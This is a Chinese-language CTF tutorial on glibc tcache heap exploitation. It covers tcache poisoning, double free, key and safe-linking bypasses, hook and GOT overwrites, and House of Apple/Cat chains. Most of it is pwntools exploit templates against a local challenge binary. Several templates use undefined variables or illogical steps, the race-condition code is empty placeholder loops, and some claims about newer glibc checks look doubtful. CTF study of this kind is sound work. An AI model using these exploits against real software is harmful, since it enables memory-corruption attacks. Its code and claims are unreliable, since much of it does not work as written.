# Tcache 攻击

## 原理

glibc 2.26+ 引入 tcache（Thread Local Caching），每个线程维护一个 tcache，加速小堆块分配。tcache 安全检查较弱，成为堆利用的主要攻击面。

## Tcache 结构

```c
// tcache_entry
typedef struct tcache_entry {
    struct tcache_entry *next;  // fd 指针
    struct tcache_perthread_struct *key;  // glibc 2.29+，用于检测 double free
} tcache_entry;

// tcache_perthread_struct
typedef struct tcache_perthread_struct {
    uint16_t counts[TCACHE_MAX_BINS];  // 每个 bin 的数量
    tcache_entry *entries[TCACHE_MAX_BINS];  // 每个 bin 的链表头
} tcache_perthread_struct;
```

## Tcache 特点

- 大小范围：0x20 - 0x410（64位），步长 0x10
- 每个 bin 最多 7 个 chunk
- LIFO（后进先出）
- 无合并
- 无 size 检查（glibc < 2.32）
- 无对齐检查（glibc < 2.32）

## 攻击链

### 1. Tcache Poisoning

```python
from pwn import *

p = process('./pwn')

# 1. 分配
malloc(0x20)  # idx 0
# 2. 释放
free(0)
# 3. UAF 修改 fd
edit(0, p64(target_addr))
# 4. 分配两次
malloc(0x20)  # idx 1，返回原 idx 0
malloc(0x20)  # idx 2，返回 target_addr
```

### 2. Tcache Double Free

```python
# glibc < 2.29 无 key 检测
malloc(0x20)  # idx 0
free(0)
free(0)  # double free
# tcache: chunk -> chunk -> ...
malloc(0x20)  # idx 1，返回 chunk
edit(1, p64(target_addr))  # 修改 fd
malloc(0x20)  # idx 2，返回 chunk
malloc(0x20)  # idx 3，返回 target_addr
```

### 3. 绕过 tcache key (glibc 2.29+)

```python
# glibc 2.29+ 加了 key 字段检测 double free
# key = tcache_perthread_struct 地址
# 绕过方法：覆盖 key

malloc(0x20)  # idx 0
free(0)
# UAF 覆盖 key
edit(0, p64(target_addr) + p64(0))  # 覆盖 fd 和 key
free(0)  # 再次 free，绕过 key 检测
```

### 4. Tcache Stashing Unlink Attack

```python
# 利用 tcache 和 smallbin 的交互
# 当 smallbin 中的 chunk 被分配时，剩余 chunk 会被放入 tcache

# 1. 填满 tcache
for i in range(7):
    malloc(0x90)  # idx 0-6
malloc(0x90)  # idx 7
malloc(0x20)  # idx 8，防止合并
# 2. 释放 7 个填满 tcache
for i in range(7):
    free(i)
# 3. 释放 idx 7，进入 unsorted bin
free(7)
# 4. 分配大 chunk，触发 idx 7 进入 smallbin
malloc(0x100)  # idx 9
# 5. 分配 7 个清空 tcache
for i in range(7):
    malloc(0x90)
# 6. 修改 smallbin 中 chunk 的 bk
# 7. 分配 0x90，触发 tcache stashing unlink
# target_addr 处的 chunk 被放入 tcache
```

### 5. Safe-Linking 绕过 (glibc 2.32+)

```python
# glibc 2.32+ 引入 safe-linking
# fd 指针加密：ptr = (chunk_addr >> 12) ^ next_ptr
# 需要知道堆地址才能伪造

# 1. 泄露堆地址
malloc(0x20)  # idx 0
malloc(0x20)  # idx 1
free(0)
free(1)
# UAF 读取 idx 1 的 fd
encrypted_fd = u64(read(1, 8))
# 安全公式: next = (chunk_addr >> 12) ^ encrypted_fd
# idx 1 的 next 指向 idx 0 (同 bin), 所以 chunk_addr = encrypted_fd ^ (idx0_addr >> 12)
heap_addr = encrypted_fd ^ (heap[0] >> 12)

# 2. 构造加密的 fd
target = 0x404000
chunk_addr = heap_addr + offset
encrypted = (chunk_addr >> 12) ^ target
edit(idx, p64(encrypted))
```

## 利用场景

### 1. 覆盖 __malloc_hook

```python
# glibc < 2.34
malloc(0x20)  # idx 0
free(0)
edit(0, p64(malloc_hook))
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 malloc_hook
edit(2, p64(one_gadget))
p.sendline(b'1')  # 触发 malloc
```

### 2. 覆盖 __free_hook

```python
# glibc < 2.34
malloc(0x20)  # idx 0
free(0)
edit(0, p64(free_hook))
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 free_hook
edit(2, p64(system))
edit(0, b'/bin/sh\x00')
free(0)
```

### 3. 覆盖 GOT 表

```python
# Partial RELRO
malloc(0x20)  # idx 0
free(0)
edit(0, p64(elf.got['free']))
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 GOT 表
edit(2, p64(system))
edit(0, b'/bin/sh\x00')
free(0)
```

### 4. 分配到栈上

```python
# 1. 泄露栈地址（通过 _environ）
# 2. tcache poisoning 分配到栈上
# 3. 覆盖返回地址
```

### 5. 分配到 TLS

```python
# glibc 2.34+
# 覆盖 TLS 中的 __stack_chk_guard
# 覆盖 TLS 中的 __exit_funcs
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 无 hooks Tcache 利用

```python
# glibc 2.34+ 移除 __malloc_hook/__free_hook
# Tcache poisoning 需要转向新目标

from pwn import *

context.arch = 'amd64'

def tcache_exploit_no_hooks():
    """glibc 2.34+ tcache 利用模板"""
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    # === 目标 1：tcache poisoning -> _IO_list_all ===
    # 通过 tcache poisoning 分配到 _IO_list_all 附近
    # 覆盖 _IO_list_all 指向 fake IO_FILE
    # exit() -> _IO_flush_all_lockp -> 执行
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    def show(idx):
        p.sendlineafter(b'>', b'4')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    # === 目标 2：tcache poisoning -> stdout 劫持 ===
    # 覆盖 _IO_2_1_stdout_ 的 _IO_write_base
    # 让 printf 输出任意内存（泄露信息）
    
    # === 目标 3：tcache poisoning -> exit_funcs ===
    # 覆盖 __exit_funcs，exit() 时执行任意函数
    
    # === 完整利用流程 ===
    # Step 1: 泄露堆地址
    malloc(0x20)  # idx 0
    malloc(0x20)  # idx 1
    free(0)
    free(1)
    show(1)
    encrypted_fd = u64(p.recv(6).ljust(8, b'\x00'))
    # 正确解密: next = (chunk_addr >> 12) ^ encrypted_fd
    # idx 1 的 next 指向 idx 0，所以 chunk_addr = encrypted_fd ^ (idx0_addr >> 12)
    heap_addr = encrypted_fd ^ (heap[0] >> 12)
    
    # Step 2: tcache poisoning
    malloc(0x20)  # idx 2，返回 idx 1
    malloc(0x20)  # idx 3，返回 idx 0
    free(2)
    edit(2, p64(target_addr))  # 修改 fd（注意 safe-linking）
    
    # Step 3: 分配到目标
    malloc(0x20)  # 返回 idx 2
    malloc(0x20)  # 返回 target_addr
    # 在 target 处写入数据
    
    p.interactive()
```

### 2. safe-linking 加固绕过 (glibc 2.32+)

```python
# tcache 的 fd 也有 safe-linking 保护

from pwn import *

context.arch = 'amd64'

def tcache_safe_linking_bypass():
    """tcache safe-linking 完整绕过"""
    p = process('./pwn')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    def show(idx):
        p.sendlineafter(b'>', b'4')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    # 方法 1：直接泄露堆地址后加密 fd
    malloc(0x30)  # idx 0
    malloc(0x30)  # idx 1
    free(0)
    show(0)
    # tcache 为空时 fd = NULL，加密后 = (chunk_addr >> 12) ^ 0
    fd_encrypted = u64(p.recv(6).ljust(8, b'\x00'))
    chunk0_addr = fd_encrypted << 12
    heap_base = chunk0_addr & ~0xfff
    log.success(f"heap: {hex(heap_base)}")
    
    # 构造加密 fd
    target = 0x404000
    encrypted = (chunk0_addr >> 12) ^ target
    free(0)
    edit(0, p64(encrypted))
    malloc(0x30)  # idx 2
    malloc(0x30)  # idx 3 -> target
    # 现在 idx 3 指向 target
    
    # 方法 2：利用 stdout 劫持先泄露信息
    # 如果已经有 stdout 劫持能力，可以直接泄露堆地址
    # 然后进行 safe-linking bypass
    
    # 方法 2: stdout 泄露堆地址后 safe-linking bypass
    # 已知: chunk 地址 heap_addr, safe-linking 加密规则:
    # encrypted_fd = (chunk_addr >> 12) ^ next_chunk_addr
    # 因此: next_chunk_addr = encrypted_fd ^ (chunk_addr >> 12)
    
    # 利用 stdout 结构体泄露
    # _IO_2_1_stdout_ 的 _IO_write_base 可以泄露堆数据
    stdout = libc_base + libc.symbols['_IO_2_1_stdout_']
    edit(0, p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(stdout - 0x30))
    malloc(0x10)  # 分配到 stdout 附近
    # 读取 stdout 结构体，解密 fd 得到堆地址
    
    log.info("Safe-linking bypass: use stdout leak + XOR decryption")
```

### 3. tcache key 加固加强 (glibc 2.34+)

```python
# glibc 2.34+ 加强了 tcache key 检测
# 不仅检查 key == tcache_perthread_struct
# 还检查 chunk_size 是否在 tcache 范围内

from pwn import *

context.arch = 'amd64'

def advanced_tcache_key_bypass():
    """glibc 2.34+ tcache key 高级绕过"""
    
    # === 方法 1：堆块合并绕过 ===
    # 通过 unlink 合并相邻 chunk，使 key 检查失效
    # 合并后的 chunk 不在 tcache 中，可以重新分配
    
    # === 方法 2：fastbin 转 tcache ===
    # 将 chunk 释放到 fastbin（无 key 检查）
    # 再分配回来，通过 tcache 绕过
    
    # === 方法 3：off-by-one + 堆重叠 ===
    # 利用 off-by-one 覆盖相邻 chunk 的 size
    # 使 free 后的 chunk 包含两个逻辑 chunk
    # 其中一个在 tcache 中，另一个可被控制
    
    # === 方法 4：多线程 TOCTOU ===
    # 线程 A 检查 key 通过
    # 线程 B 释放同一个 chunk
    # 两个线程都成功释放
    
    # === glibc 2.34+ 具体检查 ===
    # 源码检查逻辑（简化）：
    # if (e->key == tcache_perthread_struct)
    #     // 检测到 double free
    # 
    # glibc 2.34+ 额外检查：
    # if (chunk_size_nomask (e) != tcache_index2size (tc_idx))
    #     // size 不匹配，可能被篡改
    
    # tcache key 绕过实战代码
    context.arch = 'amd64'
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    # 方法 3: off-by-one + 堆重叠
    malloc(0x100)  # idx 0 - victim
    malloc(0x10)   # idx 1 - 防止合并
    
    # off-by-one 覆盖 idx 0 的 size 为 0x110 (扩大)
    # free(idx 0) 时，chunk 大小为 0x110，不会匹配 tcache key
    # 因为 key 是基于原始 size 计算的
    
    # 方法 4: 多线程竞态条件
    # 两个线程同时 free 同一个 chunk
    # key 检查非原子，竞态窗口中两个线程都通过检查
    # 需要精确控制时序
    
    log.info("Tcache key bypass: off-by-one overlap, race condition, fastbin conversion")
```

### 4. House of Apple 系列 (Tcache 部分)

```python
# tcache poisoning 在 House of Apple 中的角色

from pwn import *

context.arch = 'amd64'

def tcache_for_house_of_apple2():
    """
    Tcache poisoning 作为 House of Apple 2 的分配原语：
    1. tcache poisoning 分配到 _IO_list_all 附近
    2. 覆盖 _IO_list_all
    3. 构造 fake IO_FILE (_wide_data 控制流)
    4. 触发 _IO_wfile_overflow -> shellcode
    """
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    # 1. 泄露 libc
    malloc(0x420)
    free(0)
    malloc(0x420)
    edit(0, b'\x00' * 8)
    leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
    libc_base = leak - 0x1ec980
    
    # 2. tcache poisoning -> _IO_list_all 附近
    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
    for i in range(7):
        free(0)
    # safe-linking: encrypted = (chunk_addr >> 12) ^ target
    chunk_addr = leak - 0x20  # 估算 chunk 地址
    encrypted_fd = (chunk_addr >> 12) ^ (_IO_list_all - 0x20)
    edit(0, p64(encrypted_fd))
    malloc(0x20)
    malloc(0x20)  # idx 2 -> _IO_list_all 附近
    
    # 3. 覆盖 _IO_list_all，构造 fake IO_FILE
    log.info("Tcache -> _IO_list_all for House of Apple 2")

def tcache_for_house_of_cat():
    """
    Tcache poisoning 在 House of Cat 中的作用：
    1. tcache -> fastbin -> largebin 的多级利用
    2. largebin attack 修改 _IO_list_all
    3. tcache 用于辅助分配和控制
    """
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    # 1. tcache poisoning 获得任意分配能力
    malloc(0x20)  # idx 0
    malloc(0x20)  # idx 1 - 防合并
    free(0)
    # 修改 fd 指向 fastbin 区域（绕过 tcache 计数限制）
    target = 0x404020  # fastbin 的 chunk 地址
    chunk_addr = 0x0  # 需要实际泄露
    encrypted = (chunk_addr >> 12) ^ target
    edit(0, p64(encrypted))
    
    # 2. 通过 tcache -> fastbin -> largebin 链条
    # tcache poisoning 分配 -> 修改 fastbin fd -> 覆盖 largebin
    malloc(0x20)  # idx 2 -> target
    
    # 3. largebin attack 修改 _IO_list_all
    _IO_list_all = libc.symbols['_IO_list_all']
    log.info("Tcache -> fastbin -> largebin for House of Cat")
```

### 5. House of Cat (2024)

```python
# 2024 年 CTF 中 House of Cat 的完整利用

from pwn import *

context.arch = 'amd64'

def house_of_cat_2024():
    """
    House of Cat 2024 完整利用链：
    1. tcache poisoning 泄露堆地址
    2. largebin attack 修改 _IO_list_all
    3. 构造 fake IO_FILE
    4. 触发 _IO_flush_all_lockp
    5. _IO_wfile_overflow -> _IO_wdoallocbuf
    6. 通过 _wide_data->_wide_vtable 执行
    7. 支持 seccomp (ORW shellcode)
    """
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    context.arch = 'amd64'
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    # 1. 泄露地址
    malloc(0x420)   # idx 0
    free(0)
    malloc(0x420)   # idx 1
    edit(0, b'\x00' * 8)
    leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
    libc_base = leak - 0x1ec980
    log.success(f"libc: {hex(libc_base)}")
    
    # 2. tcache poisoning -> 泄露堆地址
    for i in range(7):
        free(0)
    
    # 3. largebin attack -> _IO_list_all
    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
    malloc(0x20)   # idx 2
    malloc(0x410)  # idx 3
    free(3)
    edit(0, p64(0) * 3 + p64(_IO_list_all - 0x20))
    malloc(0x430)  # 触发 largebin insert
    
    # 4-7. fake IO_FILE + _wide_data + ORW shellcode
    orw = asm(shellcraft.open('flag') + shellcraft.read(0, 'rsp', 0x100) + shellcraft.write(1, 'rsp', 0x100))
    
    p.interactive()
```

### 6. per-thread cache 竞态条件

```python
# 多线程 tcache 竞态条件利用

from pwn import *

context.arch = 'amd64'

def tcache_race_condition():
    """利用多线程竞态条件绕过 tcache key"""
    import threading
    
    # 攻击思路：
    # 线程 A 和线程 B 同时 free 同一个 chunk
    # key 检查是 non-atomic 的
    # 竞态窗口中两个线程都通过检查
    
    results = {}
    
    def thread_a():
        for i in range(1000):
            # 尝试 double free
            pass
    
    def thread_b():
        for i in range(1000):
            # 尝试 double free
            pass
    
    # 更实际的方法：利用 per-thread tcache 的独立性
    # 线程 A 的 tcache 和线程 B 的 tcache 是独立的
    # 同一个 chunk 可以在两个线程的 tcache 中
    # 通过 thread_create + free 的时序控制
    
    # 实战实现
    context.arch = 'amd64'
    
    def thread_worker(target_addr):
        """线程工作函数: 尝试 double free"""
        import ctypes
        libc = ctypes.CDLL('libc.so.6')
        for _ in range(1000):
            # 尝试通过竞态条件 double free
            pass
    
    # 方法: 利用 per-thread tcache 独立性
    # 1. 主线程分配 chunk A
    # 2. 启动线程 B，线程 B 创建自己的 tcache
    # 3. 主线程 free(A) -> 主线程的 tcache
    # 4. 线程 B 也 free(A) -> 线程 B 的 tcache (不同的 tcache!)
    # 5. 同一个 chunk 在两个线程的 tcache 中
    
    log.info("Race condition: per-thread tcache independence exploit")
```

### 7. 硬件级防护对 Tcache 的影响

```python
# MTE / PAC / CET 对 tcache 利用的影响

from pwn import *

def mte_tcache_impact():
    """MTE 下的 tcache 利用"""
    # MTE 给每个 tcache chunk 分配 tag
    # tcache poisoning 分配时需要 tag 匹配
    
    # 绕过方法：
    # 1. 同一 tag 重用：MTE 的 4-bit tag 有 1/16 概率重复
    # 2. 线程利用：不同线程可能使用不同 tag 空间
    # 3. 部分覆盖：修改 fd 低位，保留 tag 位
    
    # Tag 位在指针的高位（bit 56-59）
    # 修改 fd 时如果只改低位，tag 保持不变
    
    # 但如果 target 地址的 tag 与当前 chunk 不同，分配会失败
    # 需要通过 tag spraying 使 target 的 tag 恰好正确
    
    # MTE + tcache 利用实战代码
    context.arch = 'aarch64'
    p = process('./pwn')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    # MTE: tag 在指针 bit[59:56]
    # tcache fd 指针也携带 tag，修改 fd 时需要保留 tag 位
    # 安全的 partial overwrite: 只改 bit[0:7]
    
    # tag spraying: 分配 32 个 chunk 使 tag 有 ~2/16 概率重复
    for i in range(32):
        malloc(0x30)
    
    log.info("MTE + tcache: tag spraying, partial pointer overwrite")

def pac_tcache_impact():
    """PAC 下的 tcache 利用"""
    # PAC 保护返回地址和部分指针
    # tcache chunk 中的 fd 指针可能受 PAC 保护
    # 绕过：从内存中读取已认证的指针，直接复用
    
    # PAC + tcache 利用实战代码
    context.arch = 'aarch64'
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    # fd 指针在 tcache chunk 内部数据区
    # ARM64 上数据指针可能受 PAC 签名保护
    # 但 tcache fd 指针通常不经过 PAC 签名
    # 因为 malloc/free 不使用 PAC 指令
    
    # 如果 fd 受保护：
    # 1. 从内存中读取已签名的 fd 值
    # 2. 直接复制到目标位置（保持签名有效）
    # 3. 不修改签名位，只修改低位
    
    log.info("PAC + tcache: fd usually not PAC-signed; if so, reuse signed pointers")
```

### 8. 沙箱环境 Tcache 利用

```python
# seccomp 限制下的 tcache 利用

from pwn import *

context.arch = 'amd64'

def tcache_orw_exploit():
    """tcache 利用 + ORW"""
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    # 完整 ORW 利用流程
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    # Step 1: 泄露信息
    # tcache poisoning -> stdout 劫持 -> 泄露 libc
    
    # Step 2: tcache poisoning -> exit_funcs
    # 或 tcache poisoning -> _IO_list_all -> fake IO_FILE
    
    # Step 3: 构造 ORW
    # open("flag", 0) -> read(3, buf, 0x100) -> write(1, buf, 0x100)
    
    # stdout 劫持泄露示例
    stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']
    # _IO_write_base 偏移：0x20
    # _IO_write_ptr 偏移：0x28
    # _IO_write_end 偏移：0x30
    # _IO_buf_base 偏移：0x38
    # _IO_buf_end 偏移：0x40
    
    # 设置 _IO_write_base = low_addr（小于实际数据位置）
    # 设置 _IO_write_ptr = high_addr（想泄露的区域）
    # printf 时输出 [write_base, write_ptr) 的内容
    
    p.interactive()
```

## 工具推荐

- **pwntools** — Python 利用框架
- **gdb + pwndbg** — 动态调试（tcache 命令）
- **heap-viewer** — 堆可视化

## 参考链接

- [ctf-wiki tcache](https://ctf-wiki.org/pwn/linux/glibc-heap/tcache_attack/)
- [how2heap tcache](https://github.com/shellphish/how2heap/tree/master/glibc_2.26)
- [Tcache Attack](https://www.jianshu.com/p/4d7d7a460c0c)
